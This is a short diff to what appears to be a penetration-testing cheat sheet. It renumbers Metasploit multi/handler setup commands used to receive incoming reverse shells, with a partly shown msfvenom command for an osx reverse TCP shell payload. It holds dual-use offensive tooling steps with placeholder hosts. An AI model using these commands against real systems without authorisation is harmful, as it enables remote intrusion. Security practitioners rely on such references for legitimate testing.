@@ -79,10 +79,10 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port t
 
 Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.
 
-*.use exploit/multi/handler
-*.set PAYLOAD <Payload name>
-*.set LHOST <LHOST value>
-*.set LPORT <LPORT value>
-*.set ExitOnSession false
-*.exploit -j -z
+1.use exploit/multi/handler
+2.set PAYLOAD <Payload name>
+3.set LHOST <LHOST value>
+4.set LPORT <LPORT value>
+5.set ExitOnSession false
+6.exploit -j -z
 > Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘
